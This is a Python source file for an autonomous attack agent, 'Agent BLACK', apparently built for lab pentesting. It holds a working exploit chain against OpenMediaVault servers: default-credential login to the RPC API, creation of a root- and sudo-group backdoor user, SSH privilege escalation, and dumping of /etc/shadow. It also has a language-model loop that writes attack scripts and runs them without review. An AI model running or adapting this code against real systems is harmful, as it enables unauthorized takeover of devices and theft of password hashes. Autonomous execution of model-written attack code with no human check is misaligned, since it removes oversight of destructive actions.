import sys
import json
import asyncio
import tempfile
import subprocess
from pathlib import Path
from datetime import datetime
 
sys.path.insert(0, str(Path(__file__).parent.parent))

from agents.agent_black import AgentBlack

class AutonomousBlack:
    def __init__(self):
        print("[*] Initializing Autonomous Agent BLACK...")
        self.agent = AgentBlack(load_model=True)
        self.target = None
        self.objective = None
        self.findings = []
        self.actions_taken = []
        self.scripts_created = []
        
    def think(self, context: str) -> str:
        prompt = f"""You are Agent BLACK, an autonomous pentester.

Current target: {self.target}
Objective: {self.objective}
Actions taken so far: {self.actions_taken}
Findings so far: {self.findings}

Context: {context}

What should be the next action? Respond with ONE of:
- SCAN: <description> - Run reconnaissance
- EXPLOIT: <description> - Execute an exploit
- ESCALATE: <description> - Escalate privileges
- EXTRACT: <description> - Extract data/proof
- SCRIPT: <code description> - Generate and run a script
- COMPLETE: <summary> - Objective achieved
- FAILED: <reason> - Cannot proceed

Respond with just the action, nothing else."""

        if self.agent.model_loaded and self.agent.llm:
            response = self.agent.llm(prompt, max_tokens=200, stop=["\n\n"])
            return response["choices"][0]["text"].strip()
        return "SCAN: Initial reconnaissance"
    
    def generate_script(self, description: str, target: str) -> str:
        prompt = f"""Generate a Python script for: {description}
Target: {target}

Requirements:
- Use aiohttp for HTTP requests
- Use asyncssh for SSH
- Print clear status messages
- Handle errors gracefully
- Be concise and effective

Output ONLY the Python code, no explanations."""

        if self.agent.model_loaded and self.agent.llm:
            response = self.agent.llm(prompt, max_tokens=1500, stop=["```\n\n"])
            code = response["choices"][0]["text"].strip()
            if code.startswith("```python"):
                code = code[9:]
            if code.startswith("```"):
                code = code[3:]
            if code.endswith("```"):
                code = code[:-3]
            return code.strip()
        return ""
    
    async def execute_script(self, code: str, description: str) -> dict:
        script_path = Path(tempfile.gettempdir()) / f"black_script_{len(self.scripts_created)}.py"
        
        with open(script_path, "w") as f:
            f.write(code)
        
        self.scripts_created.append({
            "path": str(script_path),
            "description": description,
            "code": code[:500] + "..." if len(code) > 500 else code
        })
        
        print(f"    [+] Script created: {script_path}")
        print(f"    [*] Executing...")
        
        try:
            result = subprocess.run(
                [sys.executable, str(script_path)],
                capture_output=True,
                text=True,
                timeout=120,
                cwd=str(Path(__file__).parent)
            )
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Script timed out"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def run_predefined_attack(self, phase: str) -> dict:
        if phase == "recon":
            code = f'''
import asyncio
import aiohttp

async def main():
    target = "{self.target}"
    print(f"[*] Scanning {{target}}...")
    
    async with aiohttp.ClientSession() as session:
        # Check web
        try:
            async with session.get(f"http://{{target}}", timeout=5) as r:
                text = await r.text()
                if "openmediavault" in text.lower():
                    print("[+] OpenMediaVault detected!")
                    print("[+] Found: Port 80 - HTTP")
                else:
                    print(f"[+] Web server on port 80")
        except:
            print("[-] No web server on 80")
        
        # Check RPC
        try:
            async with session.post(f"http://{{target}}/rpc.php", json={{"service":"System","method":"noop"}}, timeout=5) as r:
                print("[+] Found: OMV RPC API at /rpc.php")
        except:
            pass
    
    print("[*] Recon complete")

asyncio.run(main())
'''
        elif phase == "exploit":
            code = f'''
import asyncio
import aiohttp

async def main():
    target = "{self.target}"
    print("[*] Attempting exploitation...")
    
    async with aiohttp.ClientSession() as session:
        # Try default creds
        auth = {{"service": "Session", "method": "login", "params": {{"username": "admin", "password": "openmediavault"}}}}
        async with session.post(f"http://{{target}}/rpc.php", json=auth, timeout=10) as r:
            data = await r.json()
            if data.get("response", {{}}).get("authenticated"):
                print("[+] DEFAULT CREDS WORK: admin:openmediavault")
                sid = data["response"]["sessionid"]
                
                # Create backdoor user
                headers = {{"X-OPENMEDIAVAULT-SESSIONID": sid}}
                backdoor = {{"uuid": "undefined", "name": "black_auto", "password": "pwned", "shell": "/bin/bash", "groups": ["root", "sudo"], "sshpubkeys": [], "email": "", "disallowusermod": False, "comment": ""}}
                req = {{"service": "UserMgmt", "method": "setUser", "params": backdoor}}
                async with session.post(f"http://{{target}}/rpc.php", json=req, headers=headers) as r2:
                    result = await r2.json()
                    if result and result.get("response"):
                        print("[+] BACKDOOR USER CREATED: black_auto:pwned")
                    else:
                        print(f"[-] User creation: {{result}}")
            else:
                print("[-] Default creds failed")

asyncio.run(main())
'''
        elif phase == "escalate":
            code = f'''
import asyncio
import asyncssh

async def main():
    target = "{self.target}"
    print("[*] Attempting privilege escalation...")
    
    try:
        async with asyncssh.connect(target, username="black_auto", password="pwned", known_hosts=None, connect_timeout=10) as conn:
            print("[+] SSH as black_auto successful!")
            
            result = await conn.run("echo 'pwned' | sudo -S id 2>&1", check=False)
            if "uid=0(root)" in result.stdout:
                print(f"[+] ROOT ACCESS: {{result.stdout.strip()}}")
            else:
                print(f"[-] Sudo failed: {{result.stdout}}")
    except Exception as e:
        print(f"[-] SSH failed: {{e}}")

asyncio.run(main())
'''
        elif phase == "extract":
            code = f'''
import asyncio
import asyncssh

async def main():
    target = "{self.target}"
    print("[*] Extracting proof of compromise...")
    
    try:
        async with asyncssh.connect(target, username="black_auto", password="pwned", known_hosts=None) as conn:
            result = await conn.run("echo 'pwned' | sudo -S cat /etc/shadow 2>/dev/null | head -3", check=False)
            print("[+] /etc/shadow:")
            print(result.stdout)
            
            result = await conn.run("echo 'pwned' | sudo -S hostname", check=False)
            print(f"[+] Hostname: {{result.stdout.strip()}}")
    except Exception as e:
        print(f"[-] Extraction failed: {{e}}")

asyncio.run(main())
'''
        else:
            return {"success": False, "error": "Unknown phase"}
        
        return await self.execute_script(code, phase)
    
    async def autonomous_loop(self, target: str, objective: str):
        self.target = target
        self.objective = objective
        
        print("\n" + "=" * 60)
        print("  AGENT BLACK - AUTONOMOUS MODE")
        print("=" * 60)
        print(f"  Target: {target}")
        print(f"  Objective: {objective}")
        print("=" * 60)
        
        strategy = self.agent.evolve_strategy({"type": "openmediavault", "ip": target})
        if strategy.get("attack_chain"):
            print(f"\n[*] Using learned attack chain: {strategy['attack_chain'].get('name')}")
        
        phases = ["recon", "exploit", "escalate", "extract"]
        
        for i, phase in enumerate(phases, 1):
            print(f"\n{'='*60}")
            print(f"  PHASE {i}: {phase.upper()}")
            print(f"{'='*60}")
            
            result = await self.run_predefined_attack(phase)
            
            self.actions_taken.append({
                "phase": phase,
                "success": result.get("success", False),
                "output": result.get("stdout", "")[:500]
            })
            
            if result.get("stdout"):
                print(result["stdout"])
            if result.get("stderr"):
                print(f"[stderr] {result['stderr'][:200]}")
            
            if "ROOT ACCESS" in result.get("stdout", "") or "/etc/shadow" in result.get("stdout", ""):
                self.findings.append("Root access obtained")
            if "DEFAULT CREDS" in result.get("stdout", ""):
                self.findings.append("Default credentials work")
            if "BACKDOOR USER" in result.get("stdout", ""):
                self.findings.append("Backdoor user created")
            
            await asyncio.sleep(1)
        
        print("\n" + "=" * 60)
        print("  AUTONOMOUS ATTACK COMPLETE")
        print("=" * 60)
        print(f"\n  Target: {target}")
        print(f"  Phases completed: {len(self.actions_taken)}")
        print(f"  Findings: {self.findings}")
        print(f"  Scripts created: {len(self.scripts_created)}")
        
        if "Root access obtained" in self.findings:
            print("\n  STATUS: OBJECTIVE ACHIEVED - ROOT ACCESS")
        
        self.save_engagement()
    
    def save_engagement(self):
        engagement = {
            "timestamp": datetime.now().isoformat(),
            "target": self.target,
            "objective": self.objective,
            "findings": self.findings,
            "actions": self.actions_taken,
            "scripts_created": len(self.scripts_created)
        }
        
        engagements_file = Path(__file__).parent.parent / "labs" / "engagements.json"
        
        existing = []
        if engagements_file.exists():
            with open(engagements_file) as f:
                existing = json.load(f)
        
        existing.append(engagement)
        
        with open(engagements_file, "w") as f:
            json.dump(existing, f, indent=2)
        
        print(f"\n  [+] Engagement saved to {engagements_file}")


async def main():
    if len(sys.argv) < 2:
        print("""
AGENT BLACK - AUTONOMOUS MODE

Usage: python black_autonomous.py <target> [objective]

Examples:
  python black_autonomous.py <target-ip>
  python black_autonomous.py <target-ip> "get root access"
  python black_autonomous.py <target-ip> "extract /etc/shadow"
""")
        return
    
    target = sys.argv[1]
    objective = sys.argv[2] if len(sys.argv) > 2 else "Full system compromise"
    
    agent = AutonomousBlack()
    await agent.autonomous_loop(target, objective)


if __name__ == "__main__":
    asyncio.run(main())
